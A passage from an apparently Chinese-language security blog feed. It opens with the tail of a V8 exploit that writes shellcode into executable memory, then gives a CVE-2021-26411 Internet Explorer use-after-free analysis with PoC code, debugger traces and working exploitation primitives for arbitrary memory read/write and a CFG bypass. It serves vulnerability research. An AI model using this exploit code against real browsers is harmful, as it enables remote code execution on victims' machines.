class="hljs-number">0x20n</span>;<br><br><span class="hljs-title function_">write64</span>(backing_store_addr-<span class="hljs-number">0x1n</span>,rwx_addr);<br><br><span class="hljs-comment">//write shellcode</span><br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;shellcode.<span class="hljs-property">length</span>;i++)&#123;<br><br>  data_view.<span class="hljs-title function_">setBigUint64</span>(i*<span class="hljs-number">8</span>,shellcode[i],<span class="hljs-literal">true</span>);<br><br>&#125;<br><br><span class="hljs-title function_">fun</span>();<br><br>v8 <span class="hljs-attr">git</span>:(6dc88c191f) ✗ ./out/x64_startctf.<span class="hljs-property">release</span>/d8 --allow-natives-syntax ./test.<span class="hljs-property">js</span><br><br><span class="hljs-attr">f_addr</span>:<span class="hljs-number">0x14a0c25a1e69</span><br><br><span class="hljs-attr">elements</span>:<span class="hljs-number">0x14a0c25a1ee1</span><br><br>read <span class="hljs-attr">addr</span>:0<span class="hljs-attr">x</span>:14a0c25a1ef0 <span class="hljs-attr">val</span>:<span class="hljs-number">0x326e60143000</span><br><br><span class="hljs-attr">elements</span>:<span class="hljs-number">0x725e5110161</span><br><br>write <span class="hljs-attr">addr</span>:<span class="hljs-number">0x725e5110170</span> <span class="hljs-attr">val</span>:<span class="hljs-number">0x326e60143000</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">df</span> -h<br><br>Filesystem   Size Used Avail Use% Mounted on<br><br>udev      3.9G   0 3.9G  0% /dev<br><br>tmpfs      793M 2.0M 791M  1% /run<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-26411漏洞分析报告</title>
    <link href="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
    <url>/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</url>
    
    <content type="html"><![CDATA[<h3 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1.漏洞信息"></a>1.漏洞信息</h3><p>CVE-2021-26411 该漏洞存在于iexplore.exe mshtml.dll模块,在JS9引擎处理dom对象时,由于未对nodevalue对象的有效性做判断,所导致的UAF漏洞,该漏洞可实现RCE.</p><h3 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2.漏洞分析"></a>2.漏洞分析</h3><p>漏洞poc</p><p>poc比较简单,首先创建了一个element.</p><p>创建了2个Attribute属性.</p><p>声明了一个对象obj,将obj的valueof函数进行了重载,重载后的函数会清空element的所有属性</p><p>attr1赋值obj,attr2赋值123,然后将将这两个属性赋值于element</p><p>最后清除element的attr1属性.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-keyword">var</span> element = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;xxx&#x27;</span>); <br><span class="hljs-keyword">var</span> attr1 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createAttribute</span>(<span class="hljs-string">&#x27;yyy&#x27;</span>); <br><span class="hljs-keyword">var</span> attr2 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createAttribute</span>(<span class="hljs-string">&#x27;zzz&#x27;</span>); <br><br><span class="hljs-keyword">var</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">valueOf</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        element.<span class="hljs-title function_">clearAttributes</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0x1337</span>;<br>&#125;;<br><br>attr1.<span class="hljs-property">nodeValue</span> = obj;<br>attr2.<span class="hljs-property">nodeValue</span> = <span class="hljs-number">123</span>;<br>element.<span class="hljs-title function_">setAttributeNode</span>(attr1);<br>element.<span class="hljs-title function_">setAttributeNode</span>(attr2);<br>element.<span class="hljs-title function_">removeAttributeNode</span>(attr1); <br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>通过poc来看,最有可能产生uaf的代码可能是,obj.valueof重载后的回调函数,和最后element清除attr1属性的操作.但是并不确定obj.valueof()何时会被调用,代码中没有直接调用.</p><p>开始进行调试,程序会中断于此处,edx是CAttrArray,此处为空,在取偏移为0xC的值时,引发了空指针异常.</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121164641368.png" alt="image-20220121164641368"></p><p>通过调用堆栈来看,程序会通过CElement::ie9_removeAttrubuteNode-&gt;ie9_removeAttributeNodeInternal-&gt;CattrArray::Destroy函数调用清除attr1.</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">element.remove<span class="hljs-constructor">AttributeNode(<span class="hljs-params">attr1</span>)</span>; <br></code></pre></td></tr></table></figure><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121164342089.png" alt="image-20220121164342089"></p><p>下面对CElement::ie9_removeAttributeNodeInternal函数进行分析</p><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121165916150.png" alt="image-20220121165916150"></p><p>当前CElement对象</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121170020460.png" alt="image-20220121170020460"></p><p>首先会调用函数查找需要移除的Attr对象在CAttrArray中的索引</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121170213610.png" alt="image-20220121170213610"></p><p>在CBase::FindAAIndexNS中可知CElement+0x10位置是CAttrArray数组,在数组中CAttrArray+8位置,可以看到数组.</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121170633424.png" alt="image-20220121170633424"></p><p> 这个数组中存储了Attributre和nodevalue对象.</p><p>poc中所创建的obj应是索引1处的0x165780C4,为nodevalue1,索引3处为nodevalue2,value值的0x7b&#x3D;123.</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121171411541.png" alt="image-20220121171411541"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121171856939.png" alt="image-20220121171856939"></p><p> CBase::FindAAIndexNS函数返回值为2,因为删除的元素是attr1,可知索引2处是attr1的对象.索引4为attr2的对象<img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121173218452.png" alt="image-20220121173218452"></p><p>然后程序再次调用该函数获取nodevalue对象索引,此时返回1.</p><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220121173919588.png" alt="image-20220121173919588"></p><p>接着会调用函数CBase::GetInfoBSTRat传入node_value对象索引,获取node_value值,并转换为BSTR字符串.在这个函数中获取node_value的操作会触发valueof函数的回调,会调用重载后的函数,执行”element.ClearAttribute();”的操作</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126032131061.png" alt="image-20220126032131061"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126032656724.png" alt="image-20220126032656724"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126033149896.png" alt="image-20220126033149896"></p><p>而后执行函数删除CBase::DeleteAt删除索引2处attr对象</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126035642892.png" alt="image-20220126035642892"></p><p>当前CAttrArray布局,可以看到CAttrArray由于被清空,attr和node_value元素均已被最后一个对象覆盖.</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126035713745.png" alt="image-20220126035713745"></p><p>而后再次执行函数CBase::FindAIndexNS获取node_value索引,此时由于CAttrArray被清空,已经获取不到了,此时返回-1,随后调用DeleteAt删除node_value,但是前面获取的node_value索引是-1</p><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126040100409.png" alt="image-20220126040100409"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126040243831.png" alt="image-20220126040243831"></p><p> 传入索引为-1时,会触发异常将CAttrArray置为null,在CAttrArray::Destroy函数获取成员变量时触发空指针异常.</p><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126040901034.png" alt="image-20220126040901034"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220126041141701.png" alt="image-20220126041141701"></p><p>由于在ClearAttributes();函数执行时,CAttrArray数组中会通过最后一个对象进行覆盖操作,并且在后面第一次执行CBase::DeleteAt中会进行取值.所以可以通过创建BSTR字符串,赋值给最后一个nodevalue,在SysFreeString时进行触发释放重引用.</p><p>修改后poc如下:</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">var</span> element = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;a&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">var</span> attr1 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createAttribute</span>(<span class="hljs-string">&#x27;b&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">var</span> attr2 = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createAttribute</span>(<span class="hljs-string">&quot;c&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">var</span> hd2;</span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">var</span> obj = </span></span><span class="language-xquery">&#123;&#125;</span><span class="language-xml"><span class="language-javascript">;</span></span><br><span class="language-javascript"><span class="language-xml">    obj.<span class="hljs-property">valueOf</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span></span><span class="language-xquery">&#123;</span><br><span class="language-xquery">        <span class="hljs-type">element</span>.clearAttributes();</span><br><span class="language-xquery">        <span class="hljs-keyword">return</span> <span class="hljs-number">0x1337</span>;</span><br><span class="language-xquery">    &#125;</span><span class="language-xml"><span class="language-javascript">;</span></span><br><span class="language-javascript"><span class="language-xml">    attr1.<span class="hljs-property">nodeValue</span> = obj;</span></span><br><span class="language-javascript"><span class="language-xml">    element.<span class="hljs-title function_">setAttributeNode</span>(attr1);</span></span><br><span class="language-javascript"><span class="language-xml">    element.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x10000</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;A&#x27;</span>));</span></span><br><span class="language-javascript"><span class="language-xml">    element.<span class="hljs-title function_">removeAttributeNode</span>(attr1);</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>当前Array</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220128201410452.png" alt="image-20220128201410452"></p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220128201443133.png" alt="image-20220128201443133"></p><p>执行完ClearAttributes后,CAttrArray被覆盖,并且node_value的BSTR字符串已经被释放.</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220128201726688.png" alt="image-20220128201726688"></p><p> BSTR内存空间被释放</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220128201610014.png" alt="image-20220128201610014"></p><p>第一次DeleteAt时,nodevalue中BSTR字符串内存空间被释放重引用.所以该漏洞本质是一个UAF类型的漏洞.</p><p><img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220128201944767.png" alt="image-20220128201944767"></p><h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h3><p><strong>漏洞的利用方式是通过两个指针指向该nodevalue内存,进行类型混淆,通过读写这块内存构造出一个起始地址为0,长度为0xffffffff的ArrayBuffer,然后解析为DataView,实现任意地址的读写.</strong></p><p><strong>而后通过构造RPC_MESSAGE调用NdrServerCall进行任意系统函数的调用,覆盖rpcrt4.dll系统调用为KiFastSystemCalRetl关闭rpcrt4.dll的CFG保护,然后进行任意函数的跳转.执行shellcode.</strong></p><p>在第二次DeleteAt时,FindAAIndexNS返回索引为-1,而导致在函数中主动触发异常使CAttray被置空,所以需要绕过异常,可以在ClearAttributes后,再将attribute set回去,同时在ClearAttributes释放内存后,hd2.nodevalue使用大小为0x20010的dataview对象占用这块内存空间.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript">att.<span class="hljs-property">nodeValue</span> = &#123;<br>           <span class="hljs-attr">valueOf</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>               hd1.<span class="hljs-property">nodeValue</span> = (<span class="hljs-keyword">new</span> <span class="hljs-title function_">alloc1</span>()).<span class="hljs-property">nodeValue</span><br>               ele.<span class="hljs-title function_">clearAttributes</span>()<br>               <span class="hljs-comment">//重引用被释放的内存</span><br>               hd2 = hd1.<span class="hljs-title function_">cloneNode</span>()<br>               <span class="hljs-comment">//绕过异常</span><br>               ele.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&#x27;attribute&#x27;</span>, <span class="hljs-number">1337</span>)<br>           &#125;<br>       &#125;<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">alloc1</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(abf)<br>    <span class="hljs-keyword">var</span> str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">4</span>; i &lt; abf.<span class="hljs-property">byteLength</span> - <span class="hljs-number">2</span>; i += <span class="hljs-number">2</span>)<br>        str += <span class="hljs-string">&#x27;%u&#x27;</span> + <span class="hljs-title function_">pad0</span>(view.<span class="hljs-title function_">getUint16</span>(i, <span class="hljs-literal">true</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br>    <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createAttribute</span>(<span class="hljs-string">&#x27;alloc&#x27;</span>)<br>    result.<span class="hljs-property">nodeValue</span> = <span class="hljs-built_in">unescape</span>(str)<br>    <span class="hljs-keyword">return</span> result<br>&#125;<br><br></code></pre></td></tr></table></figure><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220204063836035.png" alt="image-20220204063836035"></p><p>然后在removeAttribute时进行二次释放,然后使用一个dict对象再次占用这块内存.这样做的目的是进行类型混淆,通过hd2.nodevalue读取和修改hd0.nodevalue内存.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">alloc2</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-comment">// 创建字典对象</span><br>           <span class="hljs-keyword">var</span> dic1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">&#x27;Scripting.Dictionary&#x27;</span>)<br>           <span class="hljs-keyword">var</span> dic2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">&#x27;Scripting.Dictionary&#x27;</span>)<br>           dic2.<span class="hljs-title function_">add</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>           dic1.<span class="hljs-title function_">add</span>(<span class="hljs-number">0</span>, dic2.<span class="hljs-title function_">items</span>())<br>           dic1.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>, fake)<br>           dic1.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, arr)<br>           <span class="hljs-keyword">for</span> (i = <span class="hljs-number">3</span>; i &lt; <span class="hljs-number">0x20010</span> / <span class="hljs-number">0x10</span>; ++i)<br>               dic1.<span class="hljs-title function_">add</span>(i, <span class="hljs-number">0x12341234</span>)<br>           <span class="hljs-keyword">return</span> dic1.<span class="hljs-title function_">items</span>()<br>       &#125;<br> <span class="hljs-keyword">var</span> alloc = <span class="hljs-title function_">alloc2</span>()<br> <span class="hljs-comment">// 触发valueof函数回调</span><br> ele.<span class="hljs-title function_">removeAttributeNode</span>(att)<br> <span class="hljs-comment">//再次重引用removeAttributeNode后被释放的内存</span><br> hd0.<span class="hljs-property">nodeValue</span> = alloc<br> <span class="hljs-comment">//通过hd2.nodevalue读取重用后hd0.nodevalue内存</span><br> <span class="hljs-keyword">var</span> leak = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(<span class="hljs-title function_">dump</span>(hd2.<span class="hljs-property">nodeValue</span>))<br> <span class="hljs-comment">//fake</span><br> <span class="hljs-keyword">var</span> pAbf = leak[<span class="hljs-number">6</span>]<br> <span class="hljs-comment">//arr[]地址</span><br> <span class="hljs-keyword">var</span> pArr = leak[<span class="hljs-number">10</span>];<br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">1</span>:<span class="hljs-number">023</span>:x86&gt; dd <span class="hljs-number">0c0b8890</span><br><span class="hljs-number">0c0b8890</span>  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">098202b8</span> <span class="hljs-number">00000000</span> dict2.items()<span class="hljs-comment">;</span><br><span class="hljs-number">0c0b88a0</span>  <span class="hljs-number">00000009</span> <span class="hljs-number">00000000</span> <span class="hljs-number">09d</span>cdec<span class="hljs-number">4 00000000</span> fakeBuf ArrayBuffer(<span class="hljs-number">0</span>x100)<br><span class="hljs-number">0c0b88b0</span>  <span class="hljs-number">00000009</span> <span class="hljs-number">00000000</span> <span class="hljs-number">09d</span>cdf<span class="hljs-number">04 00000000</span> arr  [&#123;&#125;]<br><span class="hljs-number">0c0b88c0</span>  <span class="hljs-number">00000003</span> <span class="hljs-number">00000000</span> <span class="hljs-number">12341234</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">0c0b88d0</span>  <span class="hljs-number">00000003</span> <span class="hljs-number">00000000</span> <span class="hljs-number">12341234</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">0c0b88e0</span>  <span class="hljs-number">00000003</span> <span class="hljs-number">00000000</span> <span class="hljs-number">12341234</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">0c0b88f0</span>  <span class="hljs-number">00000003</span> <span class="hljs-number">00000000</span> <span class="hljs-number">12341234</span> <span class="hljs-number">00000000</span><br><span class="hljs-number">0c0b8900</span>  <span class="hljs-number">00000003</span> <span class="hljs-number">00000000</span> <span class="hljs-number">12341234</span> <span class="hljs-number">00000000</span><br></code></pre></td></tr></table></figure><p>然后取出fakeBuf的地址,并刷新nodevalue的内存写入前40个字节地址.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"> <span class="hljs-keyword">function</span> <span class="hljs-title function_">flush</span>(<span class="hljs-params"></span>) &#123;<br>            hd1.<span class="hljs-property">nodeValue</span> = (<span class="hljs-keyword">new</span> <span class="hljs-title function_">alloc1</span>()).<span class="hljs-property">nodeValue</span><br>            hd2.<span class="hljs-property">nodeValue</span> = <span class="hljs-number">0</span><br>            hd2 = hd1.<span class="hljs-title function_">cloneNode</span>()<br>        &#125;<br><span class="hljs-keyword">var</span> <span class="hljs-variable constant_">VT_I4</span> = <span class="hljs-number">0x3</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable constant_">VT_DISPATCH</span> = <span class="hljs-number">0x9</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable constant_">VT_BYREF</span> = <span class="hljs-number">0x4000</span>;<br><span class="hljs-keyword">var</span> bufArr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-keyword">var</span> fakeArr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(fake);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++) &#123;<br>     <span class="hljs-title function_">setData</span>(i + <span class="hljs-number">1</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Data</span>(<span class="hljs-variable constant_">VT_BYREF</span> | <span class="hljs-variable constant_">VT_I4</span>, pAbf + i * <span class="hljs-number">4</span>));<br>&#125;<br><span class="hljs-title function_">flush</span>();<br> <br></code></pre></td></tr></table></figure><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220219153033714.png" alt="image-20220219153033714"></p><p>再次将这些内存地址读取至bufArr[i]中,取出fakeBuf属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VBArray</span>(hd0.<span class="hljs-property">nodeValue</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++) &#123;<br>    bufArr[i] = ref.<span class="hljs-title function_">getItem</span>(i + <span class="hljs-number">1</span>);<br>&#125;<br>ref = <span class="hljs-literal">null</span>;<br><span class="hljs-title function_">setData</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Data</span>(<span class="hljs-variable constant_">VT_BYREF</span> | <span class="hljs-variable constant_">VT_I4</span>, bufArr[<span class="hljs-number">4</span>]));<br><span class="hljs-title function_">setData</span>(<span class="hljs-number">2</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Data</span>(<span class="hljs-variable constant_">VT_BYREF</span> | <span class="hljs-variable constant_">VT_I4</span>, bufArr[<span class="hljs-number">4</span>] + <span class="hljs-number">0x04</span>));<br><span class="hljs-title function_">setData</span>(<span class="hljs-number">3</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Data</span>(<span class="hljs-variable constant_">VT_BYREF</span> | <span class="hljs-variable constant_">VT_I4</span>, bufArr[<span class="hljs-number">4</span>] + <span class="hljs-number">0x1c</span>));<br><span class="hljs-title function_">flush</span>();<br></code></pre></td></tr></table></figure><p>Int32Array,ArrayBuffer内存结构参考,64位下有所差别</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Struct Int32Array     allocated at Custom Heap<br>&#123;<br>    void* pvftable<span class="hljs-comment">;</span><br>    DOWRD var_2<span class="hljs-comment">;</span><br>    DOWRD var_3<span class="hljs-comment">;</span><br>    DOWRD var_4<span class="hljs-comment">;</span><br>    DOWRD var_5<span class="hljs-comment">;</span><br>    DOWRD var_6<span class="hljs-comment">;</span><br>    DOWRD size<span class="hljs-comment">;            //条目的个数，字节数等于这项的值*4</span><br>    void* pTypeArrayData<span class="hljs-comment">;  //Arraybuffer Data</span><br>    void* pArrayBuffer<span class="hljs-comment">;   //Arraybuffer Object</span><br>    DWORD var_10<span class="hljs-comment">;</span><br>    DWORD var_11<span class="hljs-comment">;</span><br>    DWORD var_12<span class="hljs-comment">;</span><br>&#125;<br>Struct ArrayBuffer      allocated at Custom Heap<br>&#123;<br>    void* pvftable<span class="hljs-comment">;</span><br>    DOWRD var_2<span class="hljs-comment">;</span><br>    DOWRD var_3<span class="hljs-comment">;</span><br>    DOWRD var_4<span class="hljs-comment">;</span><br>    void* pTypeArrayData<span class="hljs-comment">;       //Arraybuffer Data</span><br>    DWORD size<span class="hljs-comment">;                 //array bytes</span><br>    DWORD var_10<span class="hljs-comment">;</span><br>    DWORD var_11<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里对ArrayBuffer做了封装,外层是JavaScriptDispatch对象</p><p> <img src="/2022/01/19/CVE-2021-26411%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20220219145717897.png" alt="image-20220219145717897"></p><p> <img 